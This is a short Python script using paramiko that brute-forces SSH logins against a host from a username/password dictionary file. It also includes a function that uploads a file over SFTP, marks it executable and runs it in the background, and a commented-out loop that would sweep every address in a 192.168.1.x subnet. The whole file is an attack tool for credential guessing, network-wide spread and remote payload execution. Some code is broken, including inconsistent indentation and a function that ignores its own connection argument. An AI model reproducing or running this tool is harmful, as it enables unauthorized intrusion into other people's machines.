#!/usr/bin/env python

import paramiko
import sys
import threading
import time

def sshCrack(ipAddress, dictionaryFile) :

	print "[+] Attacking Host : %s " %ipAddress

	ssh = paramiko.SSHClient()

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	for line in open(dictionaryFile, "r").readlines() :

		[username, password] = line.strip().split()

		try :
			print "[+] Trying to break in with username: %s password: %s " % (username, password)
			ssh.connect(ipAddress, username=username, password=password)

		except:
			print "[-] Failed! ..."
			continue

		print "[+] Success ... username: %s and passoword %s is VALID! " % (username, password)
        return username, password



def UploadFileAndExecute(sshConnection, fileName) :

	sftpClient = ssh.open_sftp()

	sftpClient.put(fileName, "/tmp/" +fileName)

	ssh.exec_command("chmod a+x /tmp/" +fileName)

	ssh.exec_command("nohup /tmp/" +fileName+ " &")



'''
#if __name__ == "__main__" :
#	sshCrack(sys.argv[1], sys.argv[2])

for i in range(256):
    if i != 0:
        time.sleep(1)
        ip = "192.168.1.%d" % i
        t = threading.Thread(target=sshCrack,args=(ip,sys.argv[1],))
        t.start()
        time.sleep(1)

if __name__ == "__main__" :

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(sys.argv[1], username=sys.argv[2], password=sys.argv[3])

	UploadFileAndExecute(ssh, sys.argv[4])

	ssh.close()
'''
